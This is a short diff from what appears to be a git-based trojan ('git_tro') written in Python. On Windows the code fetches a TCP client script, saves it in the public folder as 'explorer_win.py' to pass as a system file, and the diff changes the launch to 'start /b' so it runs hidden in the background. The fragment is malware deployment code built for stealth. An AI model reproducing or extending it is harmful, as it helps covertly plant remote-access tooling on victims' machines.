@@ -48,7 +48,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		sourceScript = "scripts/TCP_client.py"
 		ScriptExec = "python"
 		targetScript = os.getenv("PUBLIC")+ "\explorer_win.py"
-		cmd = ScriptExec+" "+targetScript
+		cmd = "start /b "+ScriptExec+" "+targetScript
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 	script	= get_file_contents(sourceScript)
